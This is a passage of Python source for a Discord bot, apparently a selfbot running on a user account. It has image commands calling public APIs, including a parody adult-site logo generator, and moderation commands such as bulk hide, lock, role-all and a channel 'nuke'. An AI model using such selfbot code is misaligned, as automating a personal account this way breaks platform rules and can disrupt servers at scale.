            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<a:butterfly_blue:1281973623737024553> | **Random Dog** **:** **`{prefix}dog`** \n"
            f"<a:butterfly_blue:1281973623737024553> | **Random Cat** **:** **`{prefix}cat`**\n"
            f"<a:butterfly_blue:1281973623737024553> | **Sad Cat** **:** **`{prefix}sadcat`**\n"
            f"<a:butterfly_blue:1281973623737024553> | **Random Rabbit** **:** **`{prefix}rabbit`**\n"
            f"<a:butterfly_blue:1281973623737024553> | **Random Fox** **:** **`{prefix}fox`**\n"
            f"<a:butterfly_blue:1281973623737024553> | **PHub Logo** **:** **`{prefix}phlogo <text1> <text2>`**\n"
            f"<a:butterfly_blue:1281973623737024553> | **PHub Comment** **:** **`{prefix}phcomment <name> <comment>`**\n"
            f"<a:butterfly_blue:1281973623737024553> | **Google image** **:** **`{prefix}gimage <query>`**\n"
            f"<a:butterfly_blue:1281973623737024553> | **AI Image** **:** **`{prefix}genimage <prompt>`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"            
        )
        await send(ctx, "<:devs:1290693770567749652>__images Commands__<:Titanz:1281243489635405827>", description)


    @commands.command()
    async def dog(self, ctx):
        await ctx.message.delete()
        r = requests.get("https://dog.ceo/api/breeds/image/random").json()
        link = str(r['message'])
        await self.send_image(ctx, link, "dog.png")

    @commands.command()
    async def cat(self, ctx):
        await ctx.message.delete()
        r = requests.get("https://api.thecatapi.com/v1/images/search").json()
        link = str(r[0]["url"])
        await self.send_image(ctx, link, "cat.png")

    @commands.command()
    async def rabbit(self, ctx):
        await ctx.message.delete()
        r = requests.get("https://api.bunnies.io/v2/loop/random/?media=gif,png").json()
        link = str(r['media']['gif'])
        await self.send_image(ctx, link, "rabbit.gif")

    @commands.command()
    async def sadcat(self, ctx):
        await ctx.message.delete()
        r = requests.get("https://api.alexflipnote.dev/sadcat").json()
        link = str(r['file'])
        await self.send_image(ctx, link, "rabbit.gif")

    @commands.command()
    async def fox(self, ctx):
        await ctx.message.delete()
        r = requests.get('https://randomfox.ca/floof/').json()
        link = str(r["image"])
        await self.send_image(ctx, link, "fox.png")

    @commands.command(aliases=['google','googleimg','gsearch'])
    async def gimage(self,ctx, *, query: str):
        await ctx.message.delete()
        url = 'https://www.googleapis.com/customsearch/v1'
        params = {
            'key': API_LOL,
            'cx': CX_ID,
            'q': query,
            'searchType': 'image',
            'num': 1
        }
        response = requests.get(url, params=params).json()
        try:
            image_url = response['items'][0]['link']
            await self.send_image(ctx,image_url,"gimage.png")
        except Exception as e:
            await senderror(ctx,"Error","An unknown error occured")

    @commands.command(aliases=["pornhublogo", "phlogo"])
    async def pornhub(self, ctx, word1=None, word2=None):
        await ctx.message.delete()
        if word1 is None or word2 is None:
            await ctx.send("Missing parameters")
            return
        endpoint = f"https://api.alexflipnote.dev/pornhub?text={word1}&text2={word2}"
        await self.send_image(ctx, endpoint, "phlogo.png")

    @commands.command(aliases=["pornhubcomment", 'phc'])
    async def phcomment(self, ctx, user: discord.Member, *, args=None):
        await ctx.message.delete()
        if user is None or args is None:
            await ctx.send("Missing parameters")
            return
        endpoint = f"https://nekobot.xyz/api/imagegen?type=phcomment&text={args}&username={user.name}&image={user.avatar.url}"
        r = requests.get(endpoint)
        res = r.json()
        await self.send_image(ctx, res["message"], "phcomment.png")

    @commands.command(aliases=['genimage','genimg'])
    async def img(self, ctx, *, prompt: str):
        await ctx.message.delete()
        api_url = "https://api.kastg.xyz/api/ai/aiig"
        default_prompt = "(worst quality, low quality, lowres, etc.)"
        
        params = {
            "prompt": prompt,
            "n_p": default_prompt
        }
        
        response = requests.get(api_url, params=params)
        
        if response.status_code == 200:
            data = response.json()
            image_urls = data.get("result", [{}])[0].get("url", [])
            
            if image_urls:
                for url in image_urls:
                    await self.send_image(ctx,url,"image.png")
            else:
                await ctx.send("No images were generated.")
        else:
            await ctx.send("Failed to generate the image. Please try again later.")

snipe_cache = {}

class mod(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.sniped_edits = {}

    async def modify_permission(self, channel, role, **permissions):
        current_permissions = channel.overwrites_for(role)
        for key, value in permissions.items():
            setattr(current_permissions, key, value)
        await channel.set_permissions(role, overwrite=current_permissions)


    async def get_user_from_id(self, ctx, user):
        if user.startswith("<@") and user.endswith(">"):
            user_id = int(user[2:-1].replace("!", "")) 
            return ctx.guild.get_member(user_id)
        else:
            try:
                if user.isdigit():
                    return ctx.guild.get_member(int(user))
                else:
                    return discord.utils.get(ctx.guild.members, name=user.split('#')[0], discriminator=user.split('#')[1])
            except (ValueError, IndexError):
                return None


    async def send_webhook_message(self, ctx, title, description):
        try:
            with open('config.json', 'r') as config_file:
                config = json.load(config_file)
            color = int(config.get("embed_colour").lstrip("#"), 16)
            webhook = await ctx.channel.create_webhook(name=title) 
            embed = discord.Embed(
                title=f"{description}",
                color=discord.Color(color)
            )
            avatar = ctx.author.avatar.url or "https://i.postimg.cc/PqnFB2PX/20250312-144720.png"
            await webhook.send(embed=embed, username=title, avatar_url=avatar)
            await webhook.delete()
        except:
            await send(ctx,title,description)

    @commands.command(aliases=["guilname","guildrename"])
    async def gname(self, ctx, *, name: str):
        await ctx.message.delete()
        if ctx.guild:
            await ctx.guild.edit(name=name)
            await ctx.send(f"<:white_arrow:1290693789824061461> **Server name changed to {name}**")

    @commands.command()
    async def makech(self, ctx, name: str, category_id: int = None):
        guild = ctx.guild
        if guild:
            category = discord.utils.get(guild.categories, id=category_id) if category_id else None
            new_channel = await guild.create_text_channel(name, category=category)
            await ctx.send(f"<:white_arrow:1290693789824061461> **Created channel: {new_channel.mention}**")

    @commands.command()
    async def makecat(self, ctx, *, name: str):
        guild = ctx.guild
        if guild:
            new_category = await guild.create_category(name)
            await ctx.send(f"<:white_arrow:1290693789824061461> **Created category: {new_category.name}**")

    @commands.command()
    async def makerole(self,ctx, *, name: str,hex_color: str = None):
        await ctx.message.delete()
        guild = ctx.guild
        if guild:
            if hex_color:
                try:
                    color = int(hex_color.lstrip("#"), 16)
                except ValueError:
                    await ctx.send("Invalid color format. Use hex format (e.g., #FF5733).")
                    return
            else:
                color = discord.Color.default()
            new_role = await guild.create_role(name=name, color=color)
            await ctx.send(f"<:white_arrow:1290693789824061461> **Created role: {new_role.name}**")

    @commands.command()
    async def delcat(self,ctx,category_id):
        await ctx.message.delete()
        guild = ctx.guild
        if guild:
            category = discord.utils.get(guild.categories, id=category_id)
            if category:
                await category.delete()
                await ctx.send(f"<:white_arrow:1290693789824061461> **Deleted category: {category.name}**")
            else:
                await ctx.send("Category not found.")        

    @commands.command()
    async def delrole(self,ctx,role:discord.Role):
        await ctx.message.delete()
        guild = ctx.guild
        if guild:
            role = discord.utils.get(guild.roles, id=role.id)
            if role:
                await role.delete()
                await ctx.send(f"<:white_arrow:1290693789824061461> **Deleted role: {role.name}**")
            else:
                await ctx.send("Role not found.")

    @commands.command(aliases=['moderetion', 'mod', 'moderation'])
    async def mods(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound:
            pass 
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"            
            f"<a:Bot:1336670517486161951> | **Purge messages** **:** **`{prefix}purge [count]`**\n"
            f"<a:Bot:1336670517486161951> | **Snipe message** **:** **`{prefix}snipe`**\n"
            f"<a:Bot:1336670517486161951> | **Snipe all messages** **:** **`{prefix}snipeall`**\n"            
            f"<a:Bot:1336670517486161951> | **Edit snipe message** **:** **`{prefix}esnipe`**\n"
            f"<a:Bot:1336670517486161951> | **Edit Snipe all messages** **:** **`{prefix}esnipeall`**\n" 
            f"<a:Bot:1336670517486161951> | **Deleted Logging** **:** **`{prefix}deleted_logs [enable/disable]`**\n"      
            f"<a:Bot:1336670517486161951> | **Edited Logging** **:** **`{prefix}edited_logs [enable/disable]`**\n"            
            f"<a:Bot:1336670517486161951> | **Bot latency** **:** **`{prefix}ping`**\n"
            f"<a:Bot:1336670517486161951> | **Kick a user** **:** **`{prefix}kick [user]`**\n"
            f"<a:Bot:1336670517486161951> | **Ban a user** **:** **`{prefix}ban [user]`**\n"
            f"<a:Bot:1336670517486161951> | **Unban a user** **:** **`{prefix}unban [user]`**\n"
            f"<a:Bot:1336670517486161951> | **Mute a user** **:** **`{prefix}mute [user] [minutes]`**\n"
            f"<a:Bot:1336670517486161951> | **Unmute a user** **:** **`{prefix}unmute [user]`**\n"
            f"<a:Bot:1336670517486161951> | **Hide the channel** **:** **`{prefix}hide`**\n"
            f"<a:Bot:1336670517486161951> | **Create channel** **:** **`{prefix}makech [name] <cat ID>`**\n"
            f"<a:Bot:1336670517486161951> | **Create category** **:** **`{prefix}makecat [name]`**\n"
            f"<a:Bot:1336670517486161951> | **Create role** **:** **`{prefix}makerole [name] <hex color>`**\n"
            f"<a:Bot:1336670517486161951> | **Delete current channel** **:** **`{prefix}delete`**\n"
            f"<a:Bot:1336670517486161951> | **Change guild name** **:** **`{prefix}gname [name]`**\n"                  
            f"<a:Bot:1336670517486161951> | **Unhide the channel** **:** **`{prefix}unhide`**\n"
            f"<a:Bot:1336670517486161951> | **Hide all channels** **:** **`{prefix}hideall`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )        
        await send(ctx, "<:devs:1290693770567749652>__Moderation Commands Page 1__<:Titanz:1281243489635405827>", description)

        description2 = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"            
            f"<a:Bot:1336670517486161951> | **Unhide all channels** **:** **`{prefix}unhideall`**\n"
            f"<a:Bot:1336670517486161951> | **Lock the channel** **:** **`{prefix}lock`**\n"
            f"<a:Bot:1336670517486161951> | **Unlock the channel** **:** **`{prefix}unlock`**\n"
            f"<a:Bot:1336670517486161951> | **Lock all channels** **:** **`{prefix}lockall`**\n"
            f"<a:Bot:1336670517486161951> | **Unlock all channels** **:** **`{prefix}unlockall`**\n"
            f"<a:Bot:1336670517486161951> | **Add/remove a role** **:** **`{prefix}role [user] [role]`**\n"
            f"<a:Bot:1336670517486161951> | **Role all members** **:** **`{prefix}roleall [role]`**\n"
            f"<a:Bot:1336670517486161951> | **Role all bots** **:** **`{prefix}rolebots [role]`**\n"
            f"<a:Bot:1336670517486161951> | **Role all humans** **:** **`{prefix}rolehuman [role]`**\n"
            f"<a:Bot:1336670517486161951> | **Autorole** **:** **`{prefix}autorole [add/rem] [role]`**\n"
            f"<a:Bot:1336670517486161951> | **Autorole clear** **:** **`{prefix}aroleclear`**\n"
            f"<a:Bot:1336670517486161951> | **Change nick** **:** **`{prefix}nick [user] [new name]`**\n"
            f"<a:Bot:1336670517486161951> | **Nuke channel** **:** **`{prefix}nuke`**\n"
            f"<a:Bot:1336670517486161951> | **Create a webhook** **:** **`{prefix}createwebhook [name]`**\n"
            f"<a:Bot:1336670517486161951> | **Get userinfo** **:** **`{prefix}userinfo <user>`**\n"
            f"<a:Bot:1336670517486161951> | **Get serverinfo** **:** **`{prefix}serverinfo`**\n"
            f"<a:Bot:1336670517486161951> | **Display member count** **:** **`{prefix}members`**\n"
            f"<a:Bot:1336670517486161951> | **Display boost count** **:** **`{prefix}boosts`**\n"
            f"<a:Bot:1336670517486161951> | **Send a webhook message** **:** **`{prefix}websend [webhook_url]`**\n"
            f"<a:Bot:1336670517486161951> | **Get role info** **:** **`{prefix}roleinfo [role ID]`**\n"
            f"<a:Bot:1336670517486161951> | **Get user avatar** **:** **`{prefix}avatar [user]`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Moderation Commands Page 2__<:Titanz:1281243489635405827>", description2)        

        description3 = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<a:Bot:1336670517486161951> | **Delete Category** **:** **`{prefix}delcat [cat_id]`**\n"
            f"<a:Bot:1336670517486161951> | **Delete Role** **:** **`{prefix}delrole [role]`**\n"
            f"<a:Bot:1336670517486161951> | **Role Change Log** **:** **`{prefix}arolelogs [enable/disable]`**\n"
            f"<a:Bot:1336670517486161951> | **List Server Roles** **:** **`{prefix}listroles`**\n"
            f"<a:Bot:1336670517486161951> | **List Server Bots** **:** **`{prefix}listbots`**\n"
            f"<a:Bot:1336670517486161951> | **Rename Role** **:** **`{prefix}renamerole [role_id] [name]`**\n"
            f"<a:Bot:1336670517486161951> | **Copy Roles to New** **:** **`{prefix}copyroles`**\n"
            f"<a:Bot:1336670517486161951> | **Create Category** **:** **`{prefix}create_category [name]`**\n"
            f"<a:Bot:1336670517486161951> | **Delete Channel** **:** **`{prefix}delete_channel [channel_id]`**\n"
            f"<a:Bot:1336670517486161951> | **Rename Channel** **:** **`{prefix}rename_channel [channel_id] [name]`**\n"
            f"<a:Bot:1336670517486161951> | **Set Channel Topic** **:** **`{prefix}set_topic [channel_id] [topic]`**\n"
            f"<a:Bot:1336670517486161951> | **Delete All Emojis** **:** **`{prefix}deleteallemojis`**\n"
            f"<a:Bot:1336670517486161951> | **Format Server Emojis** **:** **`{prefix}formatguildemojis`**\n"
            f"<a:Bot:1336670517486161951> | **React to message** **:** **`{prefix}react [msg_id] [emoji]`**\n"
            f"<a:Bot:1336670517486161951> | **Remove reaction** **:** **`{prefix}unreact [msg_id] [emoji]`**\n"
            f"<a:Bot:1336670517486161951> | **Server Friends** **:** **`{prefix}serverfriends`**\n"
            f"<a:Bot:1336670517486161951> | **Get banner link** **:** **`{prefix}banner [user]`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Moderation Commands Page 3__<:Titanz:1281243489635405827>", description3)        

    @commands.command(aliases=['arole'])
    async def autorole(self, ctx, action: str, role: discord.Role):
        await ctx.message.delete()
        action = action.lower()
        if action not in ["add", "remove", "rem"]:
            await send(ctx, "Autorole", f"<:white_arrow:1290693789824061461> **Invalid action**\nUse `add` to add an autorole or `remove` to remove it.\nExample: `{ctx.prefix}autorole add @role`")
            return
        guild_id = str(ctx.guild.id)
        with open('database/autoroles.json', 'r') as f:
            data = json.load(f)
        if guild_id not in data:
            data[guild_id] = {
                "roles": [],
                "channel_id": None  # Placeholder for future setup
            }
        if action == "add":
            if role.id not in data[guild_id]["roles"]:
                data[guild_id]["roles"].append(role.id)
                with open('database/autoroles.json', 'w') as f:
                    json.dump(data, f, indent=4)
                await send(ctx, "Autorole", f"**Autorole task added**\n**Role:** {role.mention}\nRole `@{role.name}` will be assigned to new members.")
        elif action in ["remove", "rem"]:
            if role.id in data[guild_id]["roles"]:
                data[guild_id]["roles"].remove(role.id)
                with open('database/autoroles.json', 'w') as f:
                    json.dump(data, f, indent=4)
                await send(ctx, "Autorole", f"**Autorole task removed**\n**Role:** {role.mention}\nRole `@{role.name}` will no longer be assigned to new members.")

    @commands.command(aliases=['aroleclear','arolewipe','clearautorole'])
    async def autoroleclear(self,ctx):
        await ctx.message.delete()
        with open('database/autoroles.json', 'r') as f:
            data = json.load(f)
        guild_id = str(ctx.guild.id)
        if guild_id in data:
            del data[guild_id]
            with open('database/autoroles.json', 'w') as f:
                json.dump(data, f)
            await send(ctx,"Autorole",f"**Autorole task cleared**\n**Guild ID:** {guild_id}\nAll autoroles have been removed.")
        else:
            await send(ctx,"Autorole",f"**Autorole task not found**\n**Guild ID:** {guild_id}\nNo autoroles were found for this server.")

    @commands.command(aliases=['arolelog','arolelogschannel'])
    async def arolelogs(self,ctx,channel:discord.TextChannel):
        await ctx.message.delete()
        with open('database/autoroles.json', 'r') as f:
            data = json.load(f)
        guild_id = str(ctx.guild.id)
        if guild_id not in data:
            data[guild_id] = {
                "roles": [],
                "channel_id": channel.id  # Set the channel ID for logging
            }
        else:
            data[guild_id]["channel_id"] = channel.id
        with open('database/autoroles.json', 'w') as f:
            json.dump(data, f, indent=4)
        await send(ctx,"Autorole",f"**Autorole logs channel set**\n**Channel:** {channel.mention}\nAll autorole assignments will be logged in this channel.")

    @commands.Cog.listener()
    async def on_member_join(self, member):
        
        try:
            with open('database/autoroles.json', 'r') as f:
                data = json.load(f)
        except FileNotFoundError:
            return  # Config file doesn't exist

        guild_id = str(member.guild.id)
        if guild_id not in data:
            return

        role_ids = data[guild_id].get("roles", [])
        channel_id = data[guild_id].get("channel_id")
        channel = member.guild.get_channel(channel_id) if channel_id else None

        assigned_roles = []

        for role_id in role_ids:
            role = member.guild.get_role(role_id)
            if role:
                try:
                    await member.add_roles(role)
                    assigned_roles.append(role)
                except discord.Forbidden:
                    print(f"Missing permissions to assign role: {role.name}")
                    continue

        if assigned_roles and channel:
            try:
                webhook = await channel.create_webhook(name="Autorole Logs")
                roles_mentions = ", ".join([f"{r.mention}" for r in assigned_roles])
                with open('config.json', 'r') as config_file:
                    config = json.load(config_file)
                color = int(config.get("embed_colour").lstrip("#"), 16)
                embed = discord.Embed(
                    title="✅ Autorole Assigned",
                    description=f"**User:** {member.mention} (`{member}`)\n**Roles:** {roles_mentions}",
                    color=discord.Color(color)
                )

                avatar_url = member.avatar.url if member.avatar else "https://i.postimg.cc/PqnFB2PX/20250312-144720.png"
                embed.set_thumbnail(url=avatar_url)

                await webhook.send(embed=embed, username="Autorole Logs", avatar_url=avatar_url)
                await webhook.delete()
            except discord.HTTPException as e:
                await webhook.send(e)

    @commands.command(aliases=['clear'])
    async def purge(self, ctx, count: int):
        await ctx.message.delete()
        
        if isinstance(ctx.channel, (discord.DMChannel, discord.GroupChannel)):
            deleted_count = await self.delete_own_messages(ctx.channel, count)
            await ctx.send(f"**Purged `{deleted_count}` messages.**", delete_after=5)
            return
        
        if ctx.author.guild_permissions.manage_messages:
            deleted = await ctx.channel.purge(limit=count)
            await ctx.send(f"**Purged `{len(deleted)}` messages.**", delete_after=5)
        else:
            def is_own_message(message):
                return message.author == ctx.author
            deleted = await ctx.channel.purge(limit=count, check=is_own_message)
            await ctx.send(f"**Purged `{len(deleted)}` messages.**", delete_after=5)

    async def delete_own_messages(self, channel, target_count):
        delete_count = target_count
        deleted_count = 0
        async for message in channel.history(limit=100): 
            if message.author == self.bot.user:
                await message.delete()
                deleted_count += 1
                delete_count -= 1 
                if delete_count <= 0:
                    break
            else:
                delete_count -= 1 
        return deleted_count
    
    @commands.command()
    async def ping(self,ctx):
        await ctx.message.delete()
        latency = round(self.bot.latency * 1000)
        await send(ctx,"Bot ping",f"<:white_arrow:1290693789824061461> Pong : {latency} ms")

    @commands.command()
    async def nick(self, ctx, member: discord.Member, *, nickname=None):
        await ctx.message.delete()
        await member.edit(nick=nickname)
        await self.send_webhook_message(ctx, "Nickname Change", f"**`{member.display_name}`**'s nickname has been changed to **`{nickname or 'reset'}`**.")

    @commands.command()
    async def kick(self, ctx, member: discord.Member, *, reason="No reason provided"):
        await ctx.message.delete()
        await member.kick(reason=reason)
        await self.send_webhook_message(ctx, "Kick", f"User **`{member.display_name}`** has been kicked.\nReason: **`{reason}`**")

    @commands.command()
    async def ban(self, ctx, member: discord.Member, *, reason="No reason provided"):
        await ctx.message.delete()
        await ctx.guild.ban(member, reason=reason)
        await self.send_webhook_message(ctx, "Ban", f"User **`{member.display_name}`** has been banned.\nReason: **`{reason}`**")

    @commands.command()
    async def unban(self, ctx, user: str):
        await ctx.message.delete()
        banned_users = await ctx.guild.bans()
        if user.isdigit():
            user = await self.bot.fetch_user(int(user))
        else:
            user_name, user_discriminator = user.split('#')
            user = discord.utils.get(banned_users, user__name=user_name, user__discriminator=user_discriminator)

        if user:
            await ctx.guild.unban(user.user if isinstance(user, discord.guild.BanEntry) else user)
            await self.send_webhook_message(ctx, "Unban", f"User **`{user.display_name}`** has been unbanned.")
        else:
            await senderror(ctx, "Error", "User not found.")

    @commands.command()
    async def mute(self, ctx, member: discord.Member, minutes: int, *, reason="No reason provided"):
        await ctx.message.delete()
        await member.timeout(timedelta(minutes=minutes), reason=reason)
        await self.send_webhook_message(ctx, "Mute", f"User **`{member.display_name}`** has been muted for **`{minutes}`** minutes.\nReason: **`{reason}`**")


    @commands.command()
    async def unmute(self, ctx, member: discord.Member):
        await ctx.message.delete()
        await member.timeout(None)
        await self.send_webhook_message(ctx, "Unmute", f"User **`{member.display_name}`** has been unmuted.")

    @commands.command()
    async def role(self, ctx, member: discord.Member, role: discord.Role):
        await ctx.message.delete()
        if role in member.roles:
            await member.remove_roles(role)
            await self.send_webhook_message(ctx, "Role Removed", f"The **`{role.name}`** role has been removed from **`{member.display_name}`**.")
        else:
            await member.add_roles(role)
            await self.send_webhook_message(ctx, "Role Added", f"The **`{role.name}`**role has been added to **`{member.display_name}`**.")

    @commands.command()
    async def lock(self, ctx):
        await ctx.message.delete()
        await self.modify_permission(ctx.channel, ctx.guild.default_role, send_messages=False)
        await self.send_webhook_message(ctx, "Lock Channel", f"Channel {ctx.channel.mention} is now locked.")

    @commands.command()
    async def unlock(self, ctx):
        await ctx.message.delete()
        await self.modify_permission(ctx.channel, ctx.guild.default_role, send_messages=True)
        await self.send_webhook_message(ctx, "Unlock Channel", f"Channel {ctx.channel.mention} is now unlocked.")

    @commands.command()
    async def hide(self, ctx):
        await ctx.message.delete()
        await self.modify_permission(ctx.channel, ctx.guild.default_role, view_channel=False)
        await self.send_webhook_message(ctx, "Hide Channel", f"Channel {ctx.channel.mention} is now hidden from everyone.")

    @commands.command()
    async def unhide(self, ctx):
        await ctx.message.delete()
        await self.modify_permission(ctx.channel, ctx.guild.default_role, view_channel=True)
        await self.send_webhook_message(ctx, "Unhide Channel", f"Channel {ctx.channel.mention} is now visible to everyone.")

    @commands.command()
    async def lockall(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await self.modify_permission(channel, ctx.guild.default_role, send_messages=False)
                except Exception as e:
                    await ctx.send(f"Failed to lock channel {channel.name}: {e}")
        
    @commands.command()
    async def unlockall(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await self.modify_permission(channel, ctx.guild.default_role, send_messages=True)
                except Exception as e:
                    await ctx.send(f"Failed to unlock channel {channel.name}: {e}")

    @commands.command()
    async def hideall(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await self.modify_permission(channel, ctx.guild.default_role, view_channel=False)
                except Exception as e:
                    await ctx.send(f"Failed to hide channel {channel.name}: {e}")
        
    @commands.command()
    async def unhideall(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await self.modify_permission(channel, ctx.guild.default_role, view_channel=True)
                except Exception as e:
                    await ctx.send(f"Failed to unhide channel {channel.name}: {e}")

    @commands.command()
    async def roleall(self, ctx, role: discord.Role):
        await ctx.message.delete()
        for member in ctx.guild.members:
            await member.add_roles(role)
        await self.send_webhook_message(ctx, "Role Added to All", f"The **`{role.name}`** role has been added to all members.")

    @commands.command()
    async def rolebots(self, ctx, role: discord.Role):
        await ctx.message.delete()
        for member in ctx.guild.members:
            if member.bot:
                await member.add_roles(role)
        await self.send_webhook_message(ctx, "Role Added to Bots", f"The **`{role.name}`** role has been added to all bots.")

    @commands.command()
    async def rolehuman(self, ctx, role: discord.Role):
        for member in ctx.guild.members:
            if not member.bot:
                await member.add_roles(role)
        await self.send_webhook_message(ctx, "Role Added to Humans", f"The **`{role.name}`** role has been added to all human members.")

    @commands.command()
    async def rename(self, ctx, *, new_name: str):
        await ctx.message.delete()
        try:
            old_name = ctx.channel.name
            await ctx.channel.edit(name=new_name)
            await self.send_webhook_message(ctx, "Channel Renamed", f"The channel has been renamed from **`{old_name}`** to **`{new_name}`**.")
        except Exception as e:
            await senderror(ctx, "Error", f"Could not rename the channel: {str(e)}")

    @commands.command()
    async def nuke(self, ctx):
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        color = int(config.get("embed_colour").lstrip("#"), 16)
        await ctx.message.delete()
        position = ctx.channel.position
        new_channel = await ctx.channel.clone()
        await ctx.channel.delete()
        await new_channel.edit(position=position)
        webhook = await new_channel.create_webhook(name="Nuked")
        embed = discord.Embed(
            title="Nuked",
            description=f"This channel has been nuked by {ctx.author.mention}",
            color=discord.Color(color)
        )
        avatar = ctx.author.avatar.url or "https://cdn.discordapp.com/attachments/1302633643167977573/1330486487728521267/WhatsApp_image_2025-01-19_at_16.06.14_7efa39d5_cleanup.jpg?ex=678e2799&is=678cd619&hm=de66aaf46c6474ae9c8044e12ac20be38db1e93f915dcaa8ae706d4ae2716696&"
